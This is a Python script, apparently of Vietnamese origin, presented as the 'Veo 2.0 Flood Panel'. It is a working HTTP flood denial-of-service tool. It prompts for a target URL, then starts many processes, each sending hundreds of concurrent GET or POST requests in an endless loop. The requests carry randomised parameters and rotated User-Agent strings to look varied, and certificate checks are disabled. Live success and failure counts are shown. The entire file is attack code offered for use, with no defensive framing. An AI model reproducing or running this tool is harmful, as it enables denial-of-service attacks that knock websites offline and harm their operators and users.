# -*- coding: utf-8 -*-
import random
import string
import asyncio
import aiohttp
import multiprocessing as mp
import ssl
import time
from rich.console import Console
from rich.panel import Panel
from rich.live import Live 

console = Console()

# User Art 
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
]

# Random 
def rand_str(n=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))

# Multi
stats = mp.Manager().dict(success=0, fail=0) # Sơn

# SSL context chuẩn, tránh lỗi HTTPS
sslcontext = ssl.create_default_context()
sslcontext.check_hostname = False
sslcontext.verify_mode = ssl.CERT_NONE  # optional, để connect server self-signed

# Một request 
async def one_shot(session, url, method):
    try:
        headers = {"User-Agent": random.choice(UAS)}
        if method == "GET":
            q = f"?{rand_str()}={rand_str()}"
            r = await session.get(url+q, headers=headers, timeout=2, ssl=sslcontext)
        else:
            data = {rand_str(): rand_str()}
            r = await session.post(url, headers=headers, data=data, timeout=2, ssl=sslcontext)
        if r.status < 400:
            stats["success"] += 1
        else:
            stats["fail"] += 1
    except:
        stats["fail"] += 1

# flood
async def flood(url, method, concurrency=500):
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [one_shot(session, url, method) for _ in range(concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)

# Runnnnn
def runner(url, method, concurrency):
    asyncio.run(flood(url, method, concurrency))

# anh main
if __name__ == "__main__":
    console.print(Panel("[bold cyan]★ Veo 2.0 Flood Panel ★[/bold cyan]\n[green]Tool updated by ProDev[/green]", expand=False))
    url = console.input("[yellow]Nhập URL[/yellow]: ").strip()
    method = console.input("[yellow]Method (GET/POST)[/yellow]: ").strip().upper() or "GET"
    processes = int(console.input("[yellow]Số process[/yellow]: ") or 10)
    concurrency = int(console.input("[yellow]Số task mỗi process[/yellow]: ") or 500)

    console.print(f"[cyan][+][/cyan] Tấn công {url} bằng {processes} process × {concurrency} task, method {method}")

    procs = []
    for _ in range(processes):
        p = mp.Process(target=runner, args=(url, method, concurrency))
        p.daemon = True
        p.start()
        procs.append(p)

    try:
        with Live(refresh_per_second=2) as live:
            while True:
                live.update(Panel(f"[green]Success:[/green] {stats['success']}   [red]Fail:[/red] {stats['fail']}"))
                time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[red][!][/red] Dừng lại...")
        for p in procs: p.terminate() # Coded by Hevin
